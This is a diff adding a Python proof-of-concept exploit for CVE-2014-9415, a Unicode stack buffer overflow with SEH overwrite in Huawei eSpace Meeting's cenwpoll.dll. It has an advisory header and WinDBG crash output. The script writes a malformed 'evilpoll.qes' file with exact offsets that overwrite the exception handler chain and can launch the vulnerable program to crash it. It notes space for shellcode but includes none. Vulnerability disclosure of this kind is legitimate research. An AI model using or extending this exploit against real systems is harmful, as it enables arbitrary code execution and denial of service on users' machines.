@@ -1,0 +1,200 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+#
+# Huawei eSpace Meeting cenwpoll.dll Unicode Stack Buffer Overflow with SEH Overwrite
+#
+#
+# Vendor: Huawei Technologies Co., Ltd.
+# Product web page: https://www.huawei.com
+# Affected application: eSpace 1.1.11.103 (aka eSpace ECS, eSpace Desktop, eSpace Meeting, eSpace UC)
+# Affected application: Mobile Office eConference V200R003C01 6.0.0.268.v67290
+# Affected module: cenwpoll.dll 1.0.8.8
+# Binaries affected: mcstub.exe, classreader.exe, offlinepolledit.exe, eSpace.exe
+#
+# Product description:
+# --------------------
+# 1. Create more convenient Enhanced Communications (EC) services for your enterprise with this suite of
+# products. Huawei’s EC Suite (ECS) solution combines voice, data, video, and service streams, and provides
+# users with easy and secure access to their service platform from any device, in any place, at any time.
+# 2. The eSpace Meeting allows you to join meetings that support voice, data, and video functions using
+# the PC client, the tablet client, or an IP phone, or in a meeting room with an MT deployed.
+#
+# Vulnerability description:
+# --------------------------
+# eSpace Meeting is prone to a stack-based buffer overflow vulnerability (seh overwrite) because it fails
+# to properly bounds-check user-supplied data before copying it into an insufficiently sized buffer when
+# handling QES files. Attackers can exploit this issue to execute arbitrary code within the context of
+# the affected application. Failed exploit attempts will likely result in denial-of-service conditions.
+#
+# Tested on:
+# ----------
+# OS Name: Microsoft Windows 7 Professional
+# OS Version: 6.1.7601 Service Pack 1 Build 7601
+# RAM 4GB, System type: 32bit, Processor: Intel(R) Core(TM) i5-4300U CPU 1.90GHz 2.50GHz
+#
+# Vulnerability discovered by:
+# ----------------------------
+# Gjoko 'LiquidWorm' Krstic
+# Senior STTE
+# SCD-ERC
+# Munich, Germany
+# 26th of August (Tuesday), 2014
+#
+# PSIRT details:
+# --------------
+# Security advisory No.: Huawei-SA-20141217- espace
+# Initial release date: Dec 17, 2014
+# Vulnerability ID: HWPSIRT-2014-1151
+# CVE ID: CVE-2014-9415
+# Patched version: eSpace Meeting V100R001C03
+# Advisory URL: https://www.huawei.com/en/psirt/security-advisories/hw-406589
+# 
+#
+# ------------------------------------ WinDBG output ------------------------------------
+#
+# m_dwCurrentPos = 0 ,dwData = 591 ,m_dwGrowSize = 4096(1db0.1828): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=00000000 ebx=00410041 ecx=00000000 edx=00000578 esi=08de1ad8 edi=00410045
+# eip=05790f3e esp=02fc906c ebp=02fecd00 iopl=0         nv up ei pl zr na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+# *** WARNING: Unable to verify checksum for C:\Program Files\eSpace-ecs\conf\cwbin\cenwpoll.dll
+# *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\eSpace-ecs\conf\cwbin\cenwpoll.dll - 
+# cenwpoll!DllUnregisterServer+0xa59e:
+# 05790f3e 8178082c010000  cmp     dword ptr [eax+8],12Ch ds:0023:00000008=????????
+# 0:008> !exchain
+# 02feccf4: *** WARNING: Unable to verify checksum for C:\Program Files\eSpace-ecs\conf\cwbin\mcstub.exe
+# *** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\eSpace-ecs\conf\cwbin\mcstub.exe
+# mcstub+10041 (00410041)
+# Invalid exception stack at 00410041
+# Instruction Address: 0x0000000005790f3e
+# 
+# Description: Exception Handler Chain Corrupted
+# Short Description: ExceptionHandlerCorrupted
+# Exploitability Classification: EXPLOITABLE
+# Recommended Bug Title: Exploitable - Exception Handler Chain Corrupted starting at cenwpoll!DllUnregisterServer+0x000000000000a59e (Hash=0xbc5aacab.0x6c23bb0b)
+#
+# Corruption of the exception handler chain is considered exploitable
+#
+# 0:008> d ebp
+# 02fecd00  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+# 02fecd10  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+# 02fecd20  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+# 02fecd30  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+# 02fecd40  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+# 02fecd50  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+# 02fecd60  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+# 02fecd70  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+# 0:008> u ebp
+# 02fecd00 41              inc     ecx
+# 02fecd01 004100          add     byte ptr [ecx],al
+# 02fecd04 41              inc     ecx
+# 02fecd05 004100          add     byte ptr [ecx],al
+# 02fecd08 41              inc     ecx
+# 02fecd09 004100          add     byte ptr [ecx],al
+# 02fecd0c 41              inc     ecx
+# 02fecd0d 004100          add     byte ptr [ecx],al
+#
+# ------------------------------------ /WinDBG output ------------------------------------
+#
+#
+
+import sys, os, time
+
+os.system('title jterm')
+os.system('color f5')
+os.system('cls')
+piton = os.path.basename(sys.argv[0])
+
+def usage():
+	print '''
+	+---------------------------------------------+
+	|  eSpace Meeting Stack Buffer Overflow Vuln  |
+	|                                             |
+	|         Vuln ID: HWPSIRT-2014-1151          |
+	|            CVE ID: CVE-2014-9415            |
+	+---------------------------------------------+
+	'''
+	if len(sys.argv) < 2:
+		print 'Usage: \n\n\t'+piton+' <OPTION>'
+		print '\nOPTION:\n'
+		print '\t0 - Create the evil PoC file.'
+		print '\t1 - Create the evil file, start the vulnerable application and crash it.'
+		print '\t2 - Create the evil file, start the vulnerable application under Windows Debugger with SEH chain info.\n'
+		quit()
+
+usage()
+crash = sys.argv[1]
+
+dir = os.getcwd();
+file = "evilpoll.qes"
+header = '\x56\x34\x78\x12\x01\x00\x09\x00' # V4x.....
+
+time.sleep(1)
+# Overwrite FS:[0] chain (\x43 = EIP)
+buffer = '\x41' * 353 +'\x42' * 2 +'\x43' * 2 +'\x44' * 42 +'New Poll' # \x44 can be incremented (byte space for venetian shellcode)
+buffer += '\x00\x01\x00\x00\x00\x00\x00\x90'
+buffer += '\x85\xA9\xD7\x00\x01\x04\x00'
+buffer += 'TEST'+'\x01\x02\x05\x00'
+buffer += 'ANSW1'+'\x05\x00'
+buffer += 'ANSW2'
+
+poc = header + buffer
+bytes = len(poc)
+
+print '[+] Creating evil PoC file...'
+time.sleep(1)
+print '[+] Buffering:\n'
+time.sleep(1)
+
+index = 0
+while index < len(poc):
+	char = poc[index]
+	#print char,
+	sys.stdout.write(char)
+	time.sleep(10.0 / 1000.0)
+	index = index + 1
+
+try:
+	writeFile = open (file, 'w')
+	writeFile.write( poc )
+	writeFile.close()
+	time.sleep(1)
+	print '\n\n[+] File \"'+file+'\" successfully created!'
+	time.sleep(1)
+	print '[+] Location: "'+dir+'"'
+	print '[+] Wrote '+str(bytes)+' bytes.'
+except:
+	print '[-] Error while creating file!\n'
+
+if crash == '0':
+	print '\n\n[+] Done!\n'
+elif crash == '1':
+	print '[+] The script will now execute the vulnerable application with the PoC file as its argument.\n'
+	os.system('pause')
+	os.system('C:\\Progra~1\\eSpace-ecs\\conf\\cwbin\\classreader.exe "%~dp0evilpoll.qes"')
+elif crash == '2':
+	print '[+] The script will now execute the vulnerable application with the PoC file as its argument under Windows Debugger.\n'
+	os.system('pause')
+	os.system('C:\\Progra~1\\Debugg~1\\windbg.exe -Q -g -c "!exchain" -o "C:\\Progra~1\eSpace-ecs\conf\cwbin\classreader.exe" "%~dp0evilpoll.qes"')
+	print '\n[+] You should see something like this in WinDBG:'
+	print '''
+	0:000> d 0012e37c
+	0012e37c  42 00 42 00 43 00 43 00-44 00 44 00 44 00 44 00  B.B.C.C.D.D.D.D.
+	0012e38c  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.
+	0012e39c  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.
+	0012e3ac  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.
+	0012e3bc  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.
+	0012e3cc  44 00 44 00 44 00 44 00-44 00 44 00 4e 00 65 00  D.D.D.D.D.D.N.e.
+	0012e3dc  77 00 20 00 50 00 6f 00-6c 00 6c 00 00 00 00 00  w. .P.o.l.l.....
+	0012e3ec  c2 01 00 00 56 34 78 12-70 09 87 02 00 00 00 00  ....V4x.p.......
+	0:000> !exchain
+	0012e37c: 00430043
+	Invalid exception stack at 00420042
+	'''
+else:
+	print '[+] Have a nice day! ^^\n'
+	quit()
+
+print '\n[+] Have a nice day! ^^\n'
+#os.system('color 07')
